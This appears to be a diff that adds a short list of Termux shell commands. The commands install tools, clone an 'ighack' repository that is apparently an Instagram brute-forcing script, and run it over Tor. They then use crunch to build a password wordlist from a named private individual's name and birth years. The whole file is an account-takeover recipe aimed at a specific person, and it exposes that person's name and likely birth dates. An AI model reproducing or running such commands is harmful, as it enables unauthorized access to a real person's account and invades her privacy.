@@ -1,0 +1,26 @@
+apt-get update
+apt-get upgrade
+termux-
+termux-change-repo
+Ctrl + L
+pkg install python
+pkg install python2
+exit()
+pkg install git
+pip install lolcat
+git clone https://www.github.com/noob-hackers/ighack
+ls
+cd ighack/
+ls
+jobs
+fg 1
+Ctrl + C ( stop Tor )
+ping google.com
+tor &
+bash ighack.sh
+touch parnianpassword.txt
+pkg install crunch
+crunch 6 24 parnian nematbakhsh 1384 1385 2005 2006 >  parnian password.txt
+
+
+https://node1.library98.ir/user/NDA0LVZJUC1rZWx3diwxNzUyOTEyNTA5Y-HzjrzrKV
